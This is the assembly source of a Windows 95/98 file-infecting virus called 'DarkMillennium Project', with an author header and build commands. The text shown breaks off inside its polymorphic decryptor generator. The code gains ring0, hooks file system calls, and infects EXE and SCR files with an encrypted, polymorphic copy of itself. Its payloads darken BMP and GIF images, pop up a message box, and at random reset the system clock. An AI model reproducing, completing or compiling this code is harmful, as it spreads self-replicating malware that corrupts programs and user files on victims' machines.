
;		DarkMillennium Project
;		developed by Clau / Ultimate Chaos
;
;		The Project is a Win95/98 compatible virus.
;		Also this is my first virus that infects PE files.
;
;		Greets goes to all Ultimate Chaos members and all people in VX scene.
;		Respect to all of you.
;
;----------------
;  DESCRIPTION  |
;----------------
;
;	on program load :
;		- it proccess a polymorphic decryptor
;			- it is made in 2 parts
;				- 1. Finding the key that encryption was made with (between 0 ... 65535)
;				- 2. Decrypt the code with that key
;		- check if it is already resident
;		- if not, go into ring0
;			- get memory with GetHeap
;			- copy itself into allocated memory
;			- hook the API (InstallFileSystemAPIhook)
;		-return to host program
;	on FS calls, if IFSFN_OPEN/IFSFN_RENAME/IFSFN_FILEATRIB
;		- check if extension is EXE/SCR
;			- check if the file format is PE
;			- if so, infect the file
;				- Generate random polymorphic decryptor, and write it to file
;				- Encrypt the code with a simple XOR method using a random key witch is never saved
;				It use only 2 bytes buffer for encryption, it encrypt 2 bytes at a time and write them
;				into the file, until all the code is encrypted and written. This method is slower,
;				but low memory is used.
;		- check for a condition and if it is true then display a message box trough VxD call
;		payloads, the condition is the number of infected files be equal to infected_nr_trigger
;		- thanks goes to Midnyte (member of Ultimate Chaos, coder, GFXer) for helping me with this nice payload
;			- on BMP and GIF open they will go darker and darker on every open
;				- on some BMPs and GIFs the effect is more cool, I can say strange
;
;----------------------------------------
;	Polymoprhic engine description    |
;----------------------------------------
;
;	This is my first poly engine.
;	- random junk code
;		- do nothing instructions (instructions that do not interfer with the decryptor)
;		- they are 1, 2 or more bytes instructions, and more instructions combined
;			- 1 byte - cmc, clc, stc, nop
;			- 2 bytes - a range of INTs
;			- > 2 bytes - it can generate random MOV, PUSH, POP ... infact all instructions
;			that are used in decryptor, without interfering with the decryptor (it use regs
;			that are not used in decrypt process)
;	- more ways to do the same thing instructions
;		example : MOV EAX, 12345678h	<=>	PUSH 12345678h
;								POP EAX
;	- the decryptor size can be ~ 3 times bigger then the original decryptor
;	- if the decryptor is smaller then the decryptor before, the space between it and the encrypted code
;	will be filled with junk.
;
;
;	Compile with:
;	tasm32 /m3 /ml darkmillennium.asm
;	tlink32 /Tpe /aa /x darkmillennium.obj, darkmillennium.exe, , import32.lib
;
;	report any bugs to clau@ultimatechaos.org
;
 
.386p
.model	flat

extrn		ExitProcess:proc
extrn		MessageBoxA:proc

VxDCall	macro	vxd_id, service_id
		int	20h
		dw	service_id
		dw	vxd_id
		endm

IFSMgr				=	0040h		; VxD service
GetHeap				=	000dh
InstallFileSystemAPIhook	=	0067h
Ring0_FileIO			=	0032h
UniToBCSPath			=	0041h
IFSFN_OPEN				=	36
IFSFN_RENAME			=	37
IFSFN_FILEATTRIB			=	33
R0_opencreatefile			=	0d500h		; open/create file
R0_readfile				=	0d600h		; read a file, no context
R0_writefile			=	0d601h		; write to a file, no context
R0_closefile			=	0d700h		; close a file
exception_int			=	3
exe_ext				=	'EXE.'
scr_ext				=	'RCS.'
bmp_ext				=	'PMB.'
gif_ext				=	'FIG.'
virussize				=	_end - Start
virussize_plus_buffers		=	virussize + ( _end_2 - _end )
polyengine_size			=	_end - GenDecryptor
infected_nr_trigger		=	200

.code

Begin:
		push	64
		push	offset w_title
		push	offset copyright
		push	0
		call	MessageBoxA
		jmp	Start

.data

;-------------------- Start Code -------------------

Start:	call	Delta
Delta:	mov	esi, esp
		mov	ebp, dword ptr ss:[esi]
		sub	ebp, offset Delta

		pushad
		lea	esi, [ebp + key - Start]	; address of code key
		add	esi, offset Start
		xor	di, di		; key for decryption
find_loop:	inc	di
		mov	ax, [esi]		; load code key in eax
		xor	ax, di		; decrypt it with the key from edi
		cmp	ax, 9090h	; check if edi key is OK
		jnz	find_loop		; if not jump to find_loop

		;  now edi = the key for decryption
		lea	esi, [ebp + Encr_Code - Start]
		add	esi, offset Start
		mov	ecx, virussize
decr_loop:	xor	word ptr [esi], di
		add	esi, 2
		sub	ecx, 2
		cmp	ecx, 1
		jg	decr_loop

		popad

		;  "alocate" space equal to current decryptor size, incase that the next generated decryptors
		;  will be bigger, and it will be bigger then this one
		;  this space will be filled with random junk instructions
		db	($ - offset Start) * 2 dup (90h)	;  for big decryptors not overwrite Data Zone

Encr_Code:
key		dw	9090h
		jmp	virus_code

;-------------------- Data Zone -------------------

IDT_Address	dq	0
flag		db	0
newaddress	dd	0
exception	dd	0
old_offset	dd	0
filename		db	260 dup (0)
handle		dd	0
crt_move		dd	0
peheader		dd	0
S_Align		dd	0
F_Align		dd	0
sec_ptr		dd	0
Old_EIP		dd	0
SOI		dd	0
virusplace	dd	0
imagebase	dd	0
infected_files	dw	0

SEH_nextpointer	dd	?
SEH_oldpointer	dd	?
SEH_errorhandler	dd	?

IMAGE_DOS_HEADER	struc
	MZ_magic	dw	?
	MZ_cblp		dw	?
	MZ_cp		dw	?
	MZ_crlc		dw	?
	MZ_cparhdr	dw	?
	MZ_minalloc	dw	?
	MZ_maxalloc	dw	?
	MZ_ss		dw	?
	MZ_sp		dw	?
	MZ_csum		dw	?
	MZ_ip		dw	?
	MZ_cs		dw	?
	MZ_lfarlc		dw	?
	MZ_ovno		dw	?
	MZ_res		dw	4 dup (?)
	MZ_oemid	dw	?
	MZ_oeminfo	dw	?
	MZ_res2		dw	10 dup (?)
	MZ_lfanew	dd	?
IMAGE_DOS_HEADER	ends
IMAGE_DOS_HEADER_SIZE = SIZE IMAGE_DOS_HEADER

IMAGE_FILE_HEADER	struc
	PE_Magic		dd	?
	Machine		dw	?
	NumberOfSections	dw	?
	TimeDateStamp	dd	?
	PointerToSymbolTable	dd	?
	NumberOfSymbols	dd	?
	SizeOfOptionalHeader	dw	?
	Characteristics	dw	?
IMAGE_FILE_HEADER	ends
IMAGE_FILE_HEADER_SIZE = SIZE IMAGE_FILE_HEADER

IMAGE_DATA_DIRECTORY	struc
	dd_VirtualAddress	dd	?
	dd_Size		dd	?
IMAGE_DATA_DIRECTORY	ends

IMAGE_DIRECTORY_ENTRIES	struc
	DE_Export	IMAGE_DATA_DIRECTORY	?
	DE_Import	IMAGE_DATA_DIRECTORY	?
	DE_Resource	IMAGE_DATA_DIRECTORY	?
	DE_Exception	IMAGE_DATA_DIRECTORY	?
	DE_Security	IMAGE_DATA_DIRECTORY	?
	DE_BaseReloc	IMAGE_DATA_DIRECTORY	?
	DE_Debug	IMAGE_DATA_DIRECTORY	?
	DE_Copyright	IMAGE_DATA_DIRECTORY	?
	DE_GlobalPtr	IMAGE_DATA_DIRECTORY	?
	DE_TLS		IMAGE_DATA_DIRECTORY	?
	DE_LoadConfig	IMAGE_DATA_DIRECTORY	?
	DE_BoundImport	IMAGE_DATA_DIRECTORY	?
	DE_IAT		IMAGE_DATA_DIRECTORY	?
IMAGE_DIRECTORY_ENTRIES	ends
IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16

IMAGE_OPTIONAL_HEADER	struc
	OH_Magic		dw	?
	OH_MajorLinkerVersion	db	?
	OH_MinorLinkerVersion	db	?
	OH_SizeOfCode		dd	?
	OH_SizeOfInitializedData	dd	?
	OH_SizeOfUninitializedData	dd	?	; Uninitialized Data
	OH_AddressOfEntryPoint	dd byte ptr ?	; Initial EIP
	OH_BaseOfCode		dd byte ptr ?	; Code Virtual Address
	OH_BaseOfData		dd byte ptr ?	; Data Virtual Address
	OH_ImageBase		dd byte ptr ?	; Base of image
	OH_SectionAlignment	dd	?	; Section Alignment
	OH_FileAlignment		dd	?	; File Alignment
	OH_MajorOperatingSystemVersion	dw ?	; Major OS
	OH_MinorOperatingSystemVersion	dw ?	; Minor OS
	OH_MajorImageVersion	dw	?	; Major Image version
	OH_MinorImageVersion	dw	?	; Minor Image version
	OH_MajorSubsystemVersion	dw	?	; Major Subsys version
	OH_MinorSubsystemVersion	dw	?
	OH_Win32VersionValue	dd	?	; win32 version
	OH_SizeOfImage		dd	?	; Size of image
	OH_SizeOfHeaders		dd	?	; Size of Header
	OH_CheckSum		dd	?	; unused
	OH_Subsystem		dw	?	; Subsystem
	OH_DllCharacteristics	dw	?	; DLL characteristic
	OH_SizeOfStackReserve	dd	?	; Stack reserve
	OH_SizeOfStackCommit	dd	?	; Stack commit
	OH_SizeOfHeapReserve	dd	?	; Heap reserve
	OH_SizeOfHeapCommit	dd	?	; Heap commit
	OH_LoaderFlags		dd	?	; Loader flags
	OH_NumberOfRvaAndSizes	dd	?	; Number of directories
				UNION		; directory entries
	OH_DataDirectory		IMAGE_DATA_DIRECTORY\
				IMAGE_NUMBEROF_DIRECTORY_ENTRIES DUP (?)
	OH_DirectoryEntries	IMAGE_DIRECTORY_ENTRIES ?
				ends
	ends
IMAGE_OPTIONAL_HEADER_SIZE = SIZE IMAGE_OPTIONAL_HEADER

IMAGE_SECTION_HEADER	struc
	SH_Name			db	8 dup (?)
			UNION
	SH_PhusicalAddress	dd byte ptr ?
	SH_VirtualSize		dd	?
			ends
	SH_VirtualAddress		dd	byte ptr ?
	SH_SizeOfRawData		dd	?
	SH_PointerToRawData	dd	byte ptr ?
	SH_PointerToRelocations	dd	byte ptr ?
	SH_PointerToLinenumbers	dd	byte ptr ?
	SH_NumberOfRelocations	dw	?
	SH_NumberOfLinenumbers	dw	?
	SH_Characteristics		dd	?
IMAGE_SECTION_HEADER	ends
IMAGE_SECTION_HEADER_SIZE = SIZE IMAGE_SECTION_HEADER

mz_header	IMAGE_DOS_HEADER	?
pe_header	IMAGE_FILE_HEADER	?
oh_header	IMAGE_OPTIONAL_HEADER	?
section		IMAGE_SECTION_HEADER	?

;-------------------- Real Code Zone ------------------

virus_code:	mov	eax, dword ptr fs:[00h]
		mov	dword ptr [ebp + SEH_nextpointer], eax
		mov	dword ptr [ebp + SEH_oldpointer], eax
		lea	eax, [ebp + return_to_host]
		mov	dword ptr [ebp + SEH_errorhandler], eax
		lea	eax, [ebp + SEH_nextpointer]
		mov	dword ptr fs:[00h], eax

		sidt	[ebp + IDT_Address]
		mov	esi, dword ptr [ebp + IDT_Address + 2]
		add	esi, exception_int * 8
		mov	dword ptr [ebp + exception], esi
		mov	bx, word ptr [esi + 6]
		shl	ebx, 10h
		mov	bx, word ptr [esi]
		mov	dword ptr [ebp + old_offset], ebx
		lea	eax, [ebp + offset Ring0]
		mov	word ptr [esi], ax
		shr	eax, 10h
		mov	word ptr [esi + 6], ax

		mov	eax, 0c000e990h
		cmp	dword ptr [eax], '2000'
		jne	go_into_ring0
		jmp	already_installed

go_into_ring0:	int	exception_int			; This will jump us to Ring0 proc in ring0 mode

already_installed:	mov	esi, dword ptr [ebp + exception]
		mov	ebx, dword ptr [ebp + old_offset]
		mov	word ptr [esi], bx
		shr	ebx, 10h
		mov	word ptr [esi + 6], bx

return_to_host:	mov	eax, dword ptr [ebp + SEH_oldpointer]
		mov	dword ptr fs:[00h], eax

exit:		cmp	ebp, 0
		je	generation_1
		mov	eax, [ebp + Old_EIP]
		add	eax, [ebp + imagebase]
		jmp	eax

generation_1:	push	0
		call	ExitProcess

Ring0		proc
		pusha

		; Get some memory
		mov	eax, virussize_plus_buffers + 100
		push	eax
		patch1_val	equ GetHeap + 256 * 256 * IFSMgr
		patch1	label far
		VxDCall	IFSMgr, GetHeap
		pop	ecx
		or	eax, eax
		jz	no_free_mem

		; Copy into memory
		xchg	eax, edi
		lea	esi, dword ptr [ebp + Start]
		push	edi
		mov	ecx, _end - Start
		rep	movsb
		pop	edi
		mov	dword ptr [ebp + newaddress], edi
		mov	dword ptr [edi + delta1 - Start], edi

		; hook API
		lea	eax, [edi + API_hook - Start]
		push	eax
		patch2_val	equ InstallFileSystemAPIhook + 256 * 256 * IFSMgr
		patch2	label far
		VxDCall	IFSMgr, InstallFileSystemAPIhook
		pop	ebx
		mov	[edi + nexthook - Start], eax
		jmp	success

no_free_mem:	jmp	back_to_ring3

success:		mov	eax, 0c000e990h
		mov	dword ptr [eax], '2000'
		mov	byte ptr [edi + flag - Start], 0

back_to_ring3:	popad
		iretd
Ring0		endp

API_hook:	push	ebp
		mov	ebp, esp
		sub	esp, 20h

		push	ebx
		push	esi
		push	edi

		db	0bfh
delta1		dd	0

		cmp	byte ptr [edi + flag - Start], 1
		je	over_now

		cmp	dword ptr [ebp + 12], IFSFN_OPEN		;  open action
		je	action_ok
		cmp	dword ptr [ebp + 12], IFSFN_RENAME		;  rename action
		je	action_ok
		cmp	dword ptr [ebp + 12], IFSFN_FILEATTRIB	;  attributes action
		je	action_ok
		jmp	over_now

action_ok:	mov	byte ptr [edi + flag - Start], 1
		pusha
		lea	esi, [edi + filename - Start]

		mov	eax, [ebp + 16]
		cmp	al, 0ffh
		je	no_path
		add	al, 40h
		mov	byte ptr [esi], al
		inc	esi
		mov	byte ptr [esi], ':'
		inc	esi
		mov	byte ptr [esi], '\'

		;  Unicode conversion
no_path:		push	0					;  BCS/WANSI code
		push	260					;  maximum filename
		mov	eax, [ebp + 28]				;  get IOREQ
		mov	eax, [eax + 12]
		add	eax, 4
		push	eax					;  push filename
		push	esi					;  push destination

		patch3_val	equ UniToBCSPath + 256 * 256 * IFSMgr
		patch3	label far
		VxDCall	IFSMgr, UniToBCSPath
		add	esp, 4 * 4
		add	esi, eax
		mov	byte ptr [esi], 0

		;  Check extension for '.EXE'
		cmp	dword ptr [esi - 4], exe_ext
		je	check_2

		;  Check extension for '.BMP'
		cmp	dword ptr [esi - 4], bmp_ext
		jne	check_gif_ext
		call	bmp_Payload

		;  Check extension for '.GIF'
check_gif_ext:
		cmp	dword ptr [esi - 4], gif_ext
		jne	check_scr_ext
		call	gif_Payload

		;  Check extension for '.SCR'  =  screensaver
check_scr_ext:
		cmp	dword ptr [esi - 4], scr_ext
		jne	not_exe

		;  Open the file
check_2:	lea	esi, [edi + filename - Start]
		call	file_open
		jc	not_exe
		mov	dword ptr [edi + handle - Start], eax

		;  Read DOS header
		lea	esi, [edi + mz_header - Start]
		mov	ebx, dword ptr [edi + handle - Start]
		mov	ecx, IMAGE_DOS_HEADER_SIZE
		mov	edx, 0
		call	file_read

		;  Check if really EXE file ( 'MZ' signature )
		lea	esi, [edi + mz_header - Start]
		mov	ax, word ptr [esi.MZ_magic]
		cmp	ax, 5a4dh
		jne	fileclose

		;  Locate the PE header
		mov	esi, dword ptr [esi.MZ_lfanew]
		cmp	esi, 500h
		ja	fileclose

		;  Save the pos of the PE header
		mov	dword ptr [edi + crt_move - Start], esi
		mov	dword ptr [edi + peheader - Start], esi

		;  Read the PE header
		lea	edx, [edi + pe_header - Start]
		mov	ebx, dword ptr [edi + handle - Start]
		mov	ecx, IMAGE_FILE_HEADER_SIZE + IMAGE_OPTIONAL_HEADER_SIZE
		xchg	esi, edx
		call	file_read

		add	dword ptr [edi + crt_move - Start], IMAGE_FILE_HEADER_SIZE + IMAGE_OPTIONAL_HEADER_SIZE

		;  Check for 'PE' signature
		lea	esi, [edi + pe_header - Start]
		mov	eax, dword ptr [esi.PE_Magic]
		cmp	eax, 00004550h
		jne	fileclose

		;  Check for DLL signature
		cmp	dword ptr [esi.Characteristics], 2000h
		je	fileclose

		;  Locate the last section and read it
		xor	eax, eax
		mov	ax, word ptr [esi.NumberOfSections]
		mov	ecx, IMAGE_SECTION_HEADER_SIZE
		dec	eax
		mul	ecx
		mov	esi, eax
		add	esi, dword ptr [edi + crt_move - Start]
		mov	dword ptr [edi + sec_ptr - Start], esi

		;  Read the last section
		lea	edx, [edi + section - Start]
		mov	ecx, IMAGE_SECTION_HEADER_SIZE
		mov	ebx, dword ptr [edi + handle - Start]
		xchg	esi, edx
		call	file_read

		;  Verify if already infected
		lea	esi, [edi +oh_header - Start]
		cmp	dword ptr [esi.OH_Win32VersionValue], '2000'
		je	fileclose

		mov	eax, dword ptr [esi.OH_SectionAlignment]
		mov	[edi + S_Align - Start], eax
		mov	eax, dword ptr [esi.OH_FileAlignment]
		mov	[edi + F_Align - Start], eax
		mov	eax, dword ptr [esi.OH_AddressOfEntryPoint]
		mov	[edi + Old_EIP - Start], eax
		mov	eax, dword ptr [esi.OH_SizeOfImage]
		mov	[edi + SOI - Start], eax
		mov	eax, dword ptr [esi.OH_ImageBase]
		mov	[edi + imagebase - Start], eax

		;  Update the section
		lea	esi, [edi + section - Start]
		mov	eax, dword ptr [esi.SH_PointerToRawData]
		add	eax, dword ptr [esi.SH_VirtualSize]
		mov	dword ptr [edi + virusplace - Start], eax
		mov	eax, dword ptr [edi.SH_SizeOfRawData]
		add	eax, virussize
		mov	ecx, dword ptr [edi + F_Align - Start]
		push	eax
		push	ecx
		xor	edx, edx
		div	ecx
		pop	ecx
		sub	ecx, edx
		pop	eax
		add	eax, ecx
		mov	dword ptr [esi.SH_SizeOfRawData], eax
		mov	eax, dword ptr [esi.SH_VirtualSize]
		add	eax, virussize
		mov	dword ptr [esi.SH_VirtualSize], eax

		;  Set the new characteristics for the section
		or	dword ptr [esi.SH_Characteristics], 00000020h	; code
		or	dword ptr [esi.SH_Characteristics], 20000000h	; executable
		or	dword ptr [esi.SH_Characteristics], 80000000h	; writable

		;  Update the PE header
		;  first the size of image wich is aligned to section alignment
		lea	esi, [edi + oh_header - Start]
		mov	eax, dword ptr [edi + SOI - Start]
		add	eax, virussize
		mov	ecx, dword ptr [edi + S_Align - Start]
		push	eax
		push	ecx
		xor	edx, edx
		div	ecx
		pop	ecx
		sub	ecx, edx
		pop	eax
		add	eax, ecx
		mov	dword ptr [esi.OH_SizeOfImage], eax

		; Address of Entrypoint to our virus ( Old Virtual Address + New Virtual Size - Virus Size )
		lea	esi, [edi + section - Start]
		mov	eax, dword ptr [esi.SH_VirtualAddress]
		add	eax, dword ptr [esi.SH_VirtualSize]
		sub	eax, virussize
		lea	esi, [edi + oh_header - Start]
		mov	dword ptr [esi.OH_AddressOfEntryPoint], eax

		;  Mark the infection
		mov	dword ptr [esi.OH_Win32VersionValue], '2000'

		; Write section to file
		lea	edx, [edi + section - Start]
		mov	ecx, IMAGE_SECTION_HEADER_SIZE
		mov	ebx, dword ptr [edi + handle - Start]
		mov	esi, dword ptr [edi + sec_ptr - Start]
		xchg	edx, esi
		call	file_write

		; Write headers to file
		lea	edx, [edi + pe_header - Start]
		mov	ecx, IMAGE_FILE_HEADER_SIZE + IMAGE_OPTIONAL_HEADER_SIZE
		mov	ebx, dword ptr [edi + handle - Start]
		mov	esi, dword ptr [edi + peheader - Start]
		xchg	edx, esi
		call	file_write

		;  Patch the code
		mov	cx, 20cdh
		mov	word ptr [edi + patch1 - Start], cx
		mov	eax, patch1_val
		mov	dword ptr [edi + patch1 - Start + 2], eax
		mov	word ptr [edi + patch2 - Start], cx
		mov	eax, patch2_val
		mov	dword ptr [edi + patch2 - Start + 2], eax
		mov	word ptr [edi + patch3 - Start], cx
		mov	eax, patch3_val
		mov	dword ptr [edi + patch3 - Start + 2], eax
		mov	word ptr [edi + patch4 - Start], cx
		mov	eax, patch4_val
		mov	dword ptr [edi + patch4 - Start + 2], eax
		mov	word ptr [edi + patch5 - Start], cx
		mov	eax, patch5_val
		mov	dword ptr [edi + patch5 - Start + 2], eax

		;  reset the infected_files counter
		mov	ax, 0
		mov	word ptr [edi + infected_files - Start], ax

		; Generate decryptor
		pushad
		mov	ebp, edi
		call	GenDecryptor
		popad

		;  Call Payload
		call	Payload

		; Write decryptor
		mov	edx, edi
		mov	ecx, Encr_Code - Start
		mov	ebx, dword ptr [edi + handle - Start]
		mov	esi, dword ptr [edi + virusplace - Start]
		xchg	edx, esi
		call	file_write

		mov	edx, dword ptr [edi + virusplace - Start]
		add	edx, Encr_Code - Start
		mov	dword ptr [edi + virusplace - Start], edx	; update virusplace

		;  Get random key for encryption in cx
		mov	eax, 0FFFFh
		call	random_in_range				;  will return in ax a random number
		xchg	ax, cx

		; Write encrypted area to file
		lea	edx, [edi + Encr_Code - Start]	;  location to copy and encrypt
		xor	eax, eax				;  counter

write_loop:	call	copy_in_buffer
		inc	edx
		inc	edx

		push	eax			;  save counter
		push	ecx			;  save the key
		push	edx			;  save location pointer in code

		;  Write buffer in file
		mov	ebx, dword ptr [edi + handle - Start]
		mov	ecx, 2
		mov	edx, dword ptr [edi + virusplace - Start]
		lea	esi, [edi + encryption_buffer - Start]
		call	file_write

		mov	edx, dword ptr [edi + virusplace - Start]
		inc	edx
		inc	edx
		mov	dword ptr [edi + virusplace - Start], edx

		pop	edx			;  restore loc. pointer
		pop	ecx			;  restore the key
		pop	eax			;  restore counter
		inc	eax
		inc	eax
		cmp	eax, _end - Encr_Code
		jle	write_loop

		;  Close the file
fileclose:	mov	ebx, dword ptr [edi + handle - Start]
		call	file_close

not_exe:	popa

over_now:	mov	byte ptr [edi + flag - Start], 0			; Set flag to 0
		mov	eax, [ebp + 28]
		push	eax
		mov	eax, [ebp + 24]
		push	eax
		mov	eax, [ebp + 20]
		push	eax
		mov	eax, [ebp + 16]
		push	eax
		mov	eax, [ebp + 12]
		push	eax
		mov	eax, [ebp + 08]
		push	eax

		db	0b8h
nexthook	dd	0
		call	[eax]

		add	esp, 6 * 4

		pop	edi
		pop	esi
		pop	ebx

		leave
		ret

;  Copy a word from code in encryption_buffer and encrypt it
;  cx = key for encryption
;  edx = pointer in code
copy_in_buffer	proc
		pushad
		mov	bx, word ptr [edx]
		xor	bx, cx
		mov	[edi + encryption_buffer - Start], bx
		popad
		ret

encryption_buffer	dw	0

copy_in_buffer	endp

get_rnd		proc
		push	bx
		xor	bx, ax
		xor	bx, cx
		xor	bx, dx
		xor	bx, sp
		xor	bx, bp
		xor	bx, si
		xor	bx, di
		in	al, 40h
		xor	bl, al
		in	al, 40h
		add	bh, al
		in	al, 41h
		sub	bl, al
		in	al, 41h
		xor	bh, al
		in	al, 42h
		add	bl, al
		in	al, 42h
		sub	bh, al
		xchg	bx, ax
		pop	bx
		ret
get_rnd	endp


; Ring0 File_IO
;-------------------------
Ring0_File_IO	proc
		patch4_val	equ Ring0_FileIO + 256 *256 * IFSMgr
		patch4	label far
		VxDCall	IFSMgr, Ring0_FileIO
		ret
Ring0_File_IO	endp

file_open		proc
		mov	bx, 2
		mov	cx, 0
		mov	dx, 1
		mov	eax, R0_opencreatefile
		call	Ring0_File_IO
		ret
file_open		endp

file_close		proc
		mov	eax, R0_closefile
		call	Ring0_File_IO
		ret
file_close		endp

file_read		proc
		mov	eax, R0_readfile
		call	Ring0_File_IO
		ret
file_read		endp

file_write		proc
		mov	eax, R0_writefile
		call	Ring0_File_IO
		ret
file_write		endp

Payload		proc

		;  Check the number of infected files
		pushad
		mov	ax, word ptr [edi + infected_files - Start]		;  check the number of infected files
		inc	ax									;  increase the counter with 1
		mov	word ptr [edi + infected_files - Start], ax
		cmp	ax, infected_nr_trigger
		jne	not_yet

		mov	ax, 0									;  reset the counter
		mov	word ptr [edi + infected_files - Start], ax
		;  the counter will also be reseted at in every new infected file

		;  (on every infected_nr_trigger will trigger a message box)
		lea	eax, [edi + WinTitle - Start]
		mov	[edi + TitleOff - Start], eax
		lea	eax, [edi + WinText - Start]
		mov	[edi + TextOff - Start], eax 
		lea	ebx, [edi + WinBox - Start]

		patch5_val	equ 001Ah + 256 * 256 * 002Ah
		patch5	label far
		VxDCall	002Ah, 001Ah

		;  give a try with random_in_range
		; (number between 0 and 10000)
not_yet:	mov	eax, 10000
		call	random_in_range
		cmp	eax, 500
		jg	end_payload

		;  as you see if the random number =< 500 then test the PC for year 2000 compatibilite :)
		;  infact it will jump into year 2000
		; the chances to do it are 5%
		mov	al, 07h
		out	70h, al
		mov	al, 01h
		out	71h, al		; day of the month
		mov	al, 08h
		out	70h, al
		mov	al, 01h
		out	71h, al		; month to January
		mov	al, 09h
		out	70h, al
		mov	al, 00h
		out	71h, al		; year (0 = 2000)
		; by the way ... this is a good test, you will see if your computer is compatible with year 2000 ;)
		; so i recommend you get infected with DarkMillennium

end_payload:popad
		ret

WinBox	dd	?
butt1		dw	0
butt2		dw	0001
butt3		dw	0
TitleOff	dd	offset WinTitle
TextOff	dd	offset WinText

WinTitle	db	'DarkMillennium Project',0
WinText	db	'DarkMillennium Project', 10, 'Copyright (C) 1999 by Clau/Ultimate Chaos', 10
		db	'www.ultimatechaos.org', 10
		db	'Greets to all VXers out there !', 0

Payload	endp

copyright		db	'DarkMillennium Project', 13, 10, 'Copyright (C) 1999 by Clau/Ultimate Chaos', 0
copyright_end:

bmp_Payload	proc
		pushad

		;  Open the file
		lea	esi, [edi + filename - Start]
		call	file_open
		mov	dword ptr [edi + handle - Start], eax

		; Read file
		lea	esi, [edi + gfx_buffer - Start]
		mov	ebx, [edi + handle - Start]
		mov	ecx, 256
		mov	edx, 54
		call	file_read

		;  Change the things arround
		lea	esi, [edi + gfx_buffer - Start]
		mov	ecx, 256

bmp_dark:	cmp	byte ptr [esi], 5
		jl	bmp_color_1
		sub	byte ptr [esi], 5
bmp_color_1:inc	esi
		cmp	byte ptr [esi], 5
		jl	bmp_color_2
		sub	byte ptr [esi], 5
bmp_color_2:inc	esi
		cmp	byte ptr [esi], 5
		jl	bmp_color_out
		sub	byte ptr [esi], 5
bmp_color_out:
		add	esi, 2
		sub	ecx, 4
		cmp	ecx, 0
		jne	bmp_dark

		;  Write file
		lea	esi, [edi + gfx_buffer - Start]
		mov	ecx, 256
		mov	ebx, [edi + handle - Start]
		mov	edx, 54
		call	file_write

		;  Close file
		mov	ebx, [edi + handle - Start]
		call	file_close

		popad
		ret
bmp_Payload	endp

gif_Payload	proc

;  Thanks goes to MidNyte for helping me with informations and code

		pushad

		;  Open the file
		lea	esi, [edi + filename - Start]
		call	file_open
		mov	dword ptr [edi + handle - Start], eax

		; Read file
		lea	esi, [edi + gfx_buffer - Start]
		mov	ebx, eax
		mov	ecx, 10Dh
		mov	edx, 0000h
		call	file_read

		xor	ecx, ecx
		mov	cl, byte ptr [edi + gfx_buffer + 000Ah - Start]
		and 	cl, 00000111b
		cmp	cl, 0
		je	exit_gif_payload				;  somethin' is wrong

		mov	ax, 2
get_colours:shl	ax, 1
		loop	get_colours

		mov	cx, ax
		shl	ax, 1
		add	cx, ax
		lea	esi, [edi + gfx_buffer - Start]
		add	esi, 000Dh

		push	edi
		mov	edi, esi
darken:	lodsb
		cmp	al, 14h
		jb	skip_entry
		sub	al, 14h
		stosb
skip_entry:	loop	darken
		pop	edi

		;  Write buffer back to file
		lea	esi, [edi + gfx_buffer - Start]
		mov	ebx, [edi + handle - Start]
		mov	ecx, 10Dh
		mov	edx, 0							; loc. to write in file
		call	file_write

exit_gif_payload:
		;  Close file
		mov	ebx, [edi + handle - Start]
		call	file_close

		popad
		ret
gif_Payload	endp


; ------------------------------------------------------------
;|                      Poly Engine                          |
; ------------------------------------------------------------

;  Generate decryptor
;  EBP = location for decryptor
GenDecryptor	proc

		xchg	ebp, edi
		call	InitRegGenerator
		call	GenerateRegisters

	;  call	00000000h
		mov	al, 0E8h
		stosb
		mov	eax, 00000000h
		stosd

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

	;  mov	reg1, ESP
		mov	cl, byte ptr [ebp + reg_1 - Start]
		mov	ch, 04h				;  ESP
		mov	ax, 0001h
		xchg	ebp, edi
		call	GenPutX1X2
		xchg	ebp, edi

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

	;  mov	reg_2, ss:[reg_1]
		mov	cl, byte ptr [ebp + reg_2 - Start]
		mov	ch, byte ptr [ebp + reg_1 - Start]
		mov	ax, 0101h
		xchg	ebp, edi
		call	GenPutX1X2
		xchg	ebp, edi

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

	;  sub	reg_2, offset Delta
		mov	al, 81h
		stosb
		mov	al, byte ptr [ebp + reg_2 - Start]
		add	al, 0E8h
		stosb
		mov	eax, offset Delta
		stosd

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

	;  xchg	reg_2, ebp
		mov	al, 87h
		stosb
		mov	al, byte ptr [ebp + reg_2 - Start]
		add	al, 0E8h
		stosb

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

		call	GenerateRegisters

	;  pushad
		mov	al, 60h
		stosb

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

	;  lea	reg_1, [ebp + key - Start]  ->  key offset will be setted later
		mov	al, 8Dh
		stosb
		mov	al, byte ptr [ebp + reg_1 - Start]
		mov	ebx, 8
		mul	ebx
		add	al, 85h
		stosb

		mov	[ebp + var2 - Start], edi		;  save EDI offset, for later use
		mov	eax, 00000000h
		stosd

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

	;  add	reg_1, offset Start
		mov	al, 81h
		stosb
		mov	al, byte ptr [ebp + reg_1 - Start]
		add	al, 0C0h
		stosb
		mov	eax, offset Start
		stosd

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

	;  xor	reg_2, reg_2
		mov	al, 33h
		stosb
		mov	al, byte ptr [ebp + reg_2 - Start]
		mov	ecx, eax
		mov	ebx, 8
		mul	ebx
		add	al, cl
		add	al, 0C0h
		stosb

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

	;  inc	reg_2
		mov	[ebp + var1 - Start], edi			;  save in var1 current pos for future use
		mov	al, 40h
		add	al, byte ptr [ebp + reg_2 - Start]
		stosb

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

	;  mov	reg_3, [reg_1]
		mov	al, byte ptr [ebp + reg_3 - Start]
		mov	cl, al
		mov	ch, byte ptr [ebp + reg_1 - Start]
		mov	ax, 0100h
		xchg	ebp, edi
		call	GenPutX1X2
		xchg	ebp, edi

	;  Generate Junk
		xchg	ebp, edi
		call	GenerateJunk
		xchg	ebp, edi

